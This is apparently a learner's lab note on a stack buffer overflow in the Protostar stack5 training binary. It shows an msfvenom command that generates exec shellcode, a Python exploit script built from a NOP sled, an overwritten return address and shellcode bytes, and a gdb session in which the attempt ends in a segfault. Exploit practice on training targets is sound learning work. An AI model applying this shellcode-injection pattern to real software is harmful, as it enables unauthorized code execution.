# MSF Shellcode injection

- Generating the shellcode using `msfvenom` to execute id 
```bash
$ msfvenom -p linux/x86/exec CMD=id --format python -b '\x00'
```
- Writing an Exploit script
```python
import struct

buffer = '\x90' * 76
eip = struct.pack("I",0xbffff7ac+18)
payload = '\x90'*40

buf = b"\xdd\xc3\xba\x91\x82\xf2\xe2\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x0a\x31\x57\x19\x83\xc7\x04\x03\x57\x15\x73"
buf += b"\x77\x98\xe9\x2b\xe1\x0f\x88\xa3\x3c\xd3\xdd\xd4\x57"
buf += b"\x3c\xad\x72\xa8\x2a\x7e\xe0\xc1\xc4\x09\x07\x43\xf1"
buf += b"\x09\xc7\x64\x01\x67\xa3\x64\x56\x24\xa2\x84\x95\x4a"

out = buffer + eip + payload + buf
print(out)
```

- SOMEHOW the stack still has '\x00\x00' which i can't understand WHY!
```gdb
(gdb) r < /tmp/msf
Starting program: /opt/protostar/bin/stack5 < /tmp/msf

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x90909098
) at stack5/stack5.c:11
11	in stack5/stack5.c
(gdb) x/60wx $esp
0xbffff75c:	0xbffff7be	0x90909090	0x90909090	0x90909090
0xbffff76c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff77c:	0x90909090	0x90909090	0x90909090	0x91bac3dd
0xbffff78c:	0xd9e2f282	0x5ff42474	0x00b1c929	0x00000000
0xbffff79c:	0x00000000	0xbffff7d8	0x0981751b	0x23d7c30b
0xbffff7ac:	0x00000000	0x00000000	0x00000000	0x00000001
0xbffff7bc:	0x08048310	0x00000000	0xb7ff6210	0xb7eadb9b
0xbffff7cc:	0xb7ffeff4	0x00000001	0x08048310	0x00000000
0xbffff7dc:	0x08048331	0x080483c4	0x00000001	0xbffff804
0xbffff7ec:	0x080483f0	0x080483e0	0xb7ff1040	0xbffff7fc
0xbffff7fc:	0xb7fff8f8	0x00000001	0xbffff92e	0x00000000
0xbffff80c:	0xbffff948	0xbffff952	0xbffff974	0xbffff988
0xbffff81c:	0xbffff990	0xbffff9a0	0xbffff9b2	0xbffff9c5
0xbffff82c:	0xbffffa12	0xbffffa1f	0xbffffa2e	0xbffffa39
0xbffff83c:	0xbffffa4d	0xbffffa8b	0xbffffa9c	0xbfffff8c
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xbffff7cd in ?? ()
(gdb) 
```

The process just ends with seg fault.